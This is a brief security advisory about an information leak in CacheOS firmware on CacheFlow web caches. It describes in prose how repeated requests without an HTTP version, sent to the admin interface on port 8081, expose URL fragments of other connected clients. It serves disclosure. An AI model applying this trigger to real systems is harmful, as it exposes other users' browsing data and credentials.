CacheOS is the firmware designed and distributed with CacheFlow web cache systems. It is maintained and distributed by CacheFlow.

When a user connects to the system via the web administration interface on port 8081, and issues an HTTP standard-compliant request to the system, the system will prevent the user from accessing any information managed by the cache server. However, a user connecting to the system and issuing a request without the HTTP version request type (i.e. HTTP/1.0 or HTTP/1.1) multiple times may gain access to sensitive information. The cache server will leak information such as parts of URLs being accessed by a client currently connected to the cache server.

This problem makes it possible for a user to gather information, and potentially gain access to passwords, userids, or other potentially sensitive information.
